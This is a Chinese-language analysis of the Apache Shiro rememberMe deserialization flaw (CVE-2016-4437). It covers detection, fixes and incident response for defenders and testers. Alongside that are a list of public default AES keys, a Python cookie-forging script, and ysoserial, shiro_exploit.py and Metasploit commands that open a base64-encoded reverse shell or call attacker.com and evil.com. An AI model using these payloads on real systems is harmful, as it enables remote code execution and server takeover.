# Apache Shiro 反序列化远程代码执行漏洞分析与 EXP

## 1. 漏洞概述

Apache Shiro 是一个流行的 Java 安全框架（权限认证 / Session 管理）。它在 **rememberMe Cookie 反序列化** 过程中存在漏洞：攻击者若能获取或猜到 Shiro 使用的 **AES 密钥**，即可构造恶意 Cookie 触发反序列化，在服务端执行任意代码。

| 项目 | 说明 |
|------|------|
| CVE 编号 | CVE-2016-4437（首个版本）、后续多个 CVE 及不同 gadget 链 |
| 漏洞类型 | 反序列化 RCE |
| 发现时间 | 2016 年起（多个不同 gadget 链陆续发现） |
| CVSS 评分 | 9.8（Critical） |
| 影响组件 | Apache Shiro 1.x 中使用 CookieRememberMeManager 且密钥为默认或可猜解值 |
| 攻击前置 | 目标存在 rememberMe Cookie 处理 + 有可被反序列化的 gadget 类在 classpath |

## 2. 影响版本与常见默认密钥

| Shiro 版本 | 默认 AES key 是否公开 |
|------------|------------------------|
| Shiro 1.2.4 及更早 | `kPH+bIxk5D2deZiIxcaaaA==`（base64） → 公开已知 |
| Shiro 1.2.5+ | 默认随机生成密钥（每次启动不同），但**部分开发者未修改仍使用默认示例密钥** |

### 2.1 其他常见密钥（来自公开知识库 / 开发文档）

```
kPH+bIxk5D2deZiIxcaaaA==        # 最经典默认 key
2AvVhdsgUs0FSA3SDFAdag==         # 使用较广
3AvVhdsgUs0FSA3SDFAdag==         # 已知密钥
4AvVhdsgUs0FSA3SDFAdag==
5AvVhdsgUs0FSA3SDFAdag==
wGiHplamyXlVB11UXWol8g==         # 某系统默认
Z3VucwAAAAAAAAAAAAAAAA==         # 其他变种
U29mdHdhcmUgU2VjcmV0IEtleQ==    # "Software Secret Key"
MTIzNDU2Nzg5MGFiY2RlZg==         # "1234567890abcdef"
a2V5X3NlY3JldF9rZXk=             # "key_secret_key"
...（数十个公开的常见密钥，被集成到扫描器字典）
```

## 3. 漏洞原理

### 3.1 处理流程

Shiro 读取 Cookie `rememberMe` → Base64 解码 → AES-CBC 解密（使用上述密钥）→ 反序列化字节流 → 构造 Java 对象：

```
HTTP Cookie: rememberMe=XXXX
  │
  ▼
Base64.decode(XXXX)
  │
  ▼
AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==).decrypt()
  │
  ▼
ObjectInputStream.readObject() → 反序列化
  │
  ▼
Transformer / CommonsBeanutils / CommonsCollections
  → 调用链执行 Runtime.getRuntime().exec("curl evil.com")
```

### 3.2 常见 gadget 链

| 依赖库 | gadget | 说明 |
|--------|--------|------|
| CommonsCollections 3.2.1 | `InvokerTransformer` | 经典 gadget |
| CommonsBeanutils | `BeanComparator` | 无 commons-collections 时常用 |
| ROME | `ToStringBean` | 某些场景使用 |
| Spring-AOP | `AopAlliance` | 结合 Spring 应用 |
| Jdk7u21 / Jdk8u20 | JDK 自身 gadget | 不依赖第三方库 |

### 3.3 加密 / 编码流程（攻击者视角）

```python
# Python 示意：伪造 rememberMe Cookie
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64, os, subprocess

# 1) 使用 ysoserial 生成反序列化 payload
# java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,YmFza...}|{base64,-d}|{bash,-i}" > payload.ser

# 2) AES-CBC 加密（key=kPH+bIxk5D2deZiIxcaaaA==）
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv = os.urandom(16)
aes = AES.new(key, AES.MODE_CBC, iv)
with open("payload.ser", "rb") as f:
    payload = f.read()
ciphertext = aes.encrypt(pad(payload, 16))

# 3) Base64 编码
cookie = base64.b64encode(iv + ciphertext).decode()
print(f"Cookie: rememberMe={cookie}")
```

## 4. 公开 EXP

### 4.1 Shiro-721 / Shiro-550 一键脚本

```bash
# 1) 使用 shiro_exploit.py（Python2/3，社区常见脚本）
python3 shiro_exploit.py \
    -u "http://target:8080/login" \
    -t 1 \
    -g CommonsBeanutils1 \
    -c "curl attacker.com:8080/test"

# 参数：
#   -u target URL
#   -t 模式（1 = 检测 key；2 = 命令执行）
#   -g gadget 类型
#   -c 待执行命令

# 2) 使用 MSF 模块
msf6 > use exploit/multi/http/shiro_rememberme_rce
msf6 exploit(multi/http/shiro_rememberme_rce) > set RHOST target
msf6 exploit(...) > set TARGETURI /login
msf6 exploit(...) > set PAYLOAD java/jsp_shell_reverse_tcp
msf6 exploit(...) > set LHOST attacker.com
msf6 exploit(...) > exploit
```

### 4.2 手工验证（检测漏洞是否存在）

```bash
# 使用 ysoserial 生成"延时/盲命令执行"payload
# 然后发送：
curl -v "http://target:8080/login" \
    -H "Cookie: rememberMe=<base64 payload>"

# 检测方式：
#   DNS log（攻击者域名 DNS 查询数增加 → 存在漏洞）
#   时间盲注（sleep 5 秒 → 响应延迟）
#   反弹 shell（nc 监听 443 端口）
```

### 4.3 公开密钥爆破工具

```bash
# 使用 shiro_attack 批量检测
python3 shiro_attack.py --url http://target:8080/login \
    --keys keys.txt --gadgets gadget_list.txt

# keys.txt 包含数十至上百个公开已知的 base64 key
# gadget_list.txt 包含 CommonsBeanutils1 / CommonsCollections2 / ... 等 gadget
```

### 4.4 常见 payload 示例（curl 版）

```bash
# DNSLOG 测试（Burp Collaborator / CEye.io）
curl "http://target:8080/" \
    -H "Cookie: rememberMe=xxx...AES_ENCODED_SER...xxx"

# 命令执行（反弹 shell）
# 使用 base64 编码避免特殊字符
# bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hLzQ0MyAwPiYx}|{base64,-d}|{bash,-i}
```

## 5. 漏洞检测

### 5.1 Web 指纹识别

```bash
# 1) 是否返回 Set-Cookie: rememberMe=deleteMe
curl -v "http://target:8080/" 2>&1 | grep -i remember

# 2) 响应头中是否有 shiro 字样
curl -sI "http://target:8080/" | grep -i "shiro"

# 3) HTML 中是否含 Shiro 特定字段
#    <input type="checkbox" name="rememberMe" /> 等
```

### 5.2 批量扫描

```bash
# nuclei
nuclei -u http://target -t "http/cves/2016/CVE-2016-4437.yaml"

# 使用 shiro_exploit 工具批量
python3 shiro_exploit.py -f urls.txt -o vuln.txt
```

### 5.3 代码审计检测

```
Java 源码搜索：
  - "rememberMe" 字符串
  - "CookieRememberMeManager" 类
  - "setCipherKey" / "setEncryptionCipherKey" 调用
  - 硬编码 base64 字符串（形如 kPH+bIxk5D2deZiIxcaaaA==）
```

## 6. 修复方案

| 方案 | 说明 |
|------|------|
| **升级到 Shiro 1.7.1+ / 2.0+** | 官方加强反序列化白名单 |
| **使用随机、强、不在代码中硬编码的密钥** | 从环境变量 / 配置中心读取，不提交到版本控制 |
| **改用其他认证方式（如 JWT）** | 禁用 rememberMe 功能 |
| **启用 GCM 模式** | 从 AES-CBC 改为 AES-GCM（仍需强密钥） |
| **部署 RASP / WAF 拦截** | 拦截长 Cookie / 恶意 payload 特征 |
| **classpath 中减少危险库** | 去除不必要的 commons-beanutils / commons-collections |

### 6.1 代码修复示例

```java
// 错误做法（硬编码公开 key）
CookieRememberMeManager manager = new CookieRememberMeManager();
manager.setCipherKey(Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));   // 公开密钥！

// 正确做法：使用随机密钥，每次部署重新生成
CookieRememberMeManager manager = new CookieRememberMeManager();
// 密钥从环境变量 / 安全配置中心获取
manager.setCipherKey(Base64.decode(System.getenv("SHIRO_REMEMBER_KEY")));
```

### 6.2 命令行一键生成强密钥

```bash
# 随机生成 16 字节密钥（AES-128）
openssl rand -base64 16
# 示例输出： xM+PqRjKLZ8vZ2pDfA1bQA==

# AES-256 需要 32 字节（若 policy 允许）
openssl rand -base64 32
```

## 7. 应急响应

```
发现迹象：
  - 异常 rememberMe Cookie（超长、base64 特征明显）
  - 敏感命令执行痕迹（whoami / bash 反弹）
  - 目标应用短时间内大量登录 / 重定向请求

处理步骤：
  ① 阻断可疑 IP（WAF / 安全组）
  ② 检查 classpath 是否含 commons-beanutils、commons-collections
  ③ 检查代码中是否硬编码了公开密钥
  ④ 更换 Shiro rememberMe 密钥 / 禁用 rememberMe 功能
  ⑤ 检查 Web 日志中 POST /login 等 URL 的异常请求
  ⑥ 检查 Java 应用进程是否存在异常 socket 连接
  ⑦ 升级 Shiro 版本，删除不必要的危险库依赖
```

## 8. 漏洞复现靶机

```
推荐环境：
  - vulhub: docker-compose up -d shiro/CVE-2016-4437
  - CVE-2016-4437 / shiro-550 / shiro-721

复现步骤：
  1) 启动 docker
  2) 访问 http://target:8080/
  3) 点击登录（无需账户），观察 Set-Cookie: rememberMe=deleteMe
  4) 使用 shiro_exploit.py / ysoserial / java -jar shiro-exploit.jar 生成 payload
  5) Cookie 替换后请求 → 观察命令执行
```

> Shiro 反序列化是 Java Web 场景中最常见的"弱密钥 + 反序列化"漏洞组合。即便到 2025 年，大量企业系统仍在使用公开密钥或开发示例密钥。**核心修复手段：更换强随机密钥 + 升级 Shiro 版本 + 减少 classpath 中危险依赖**。
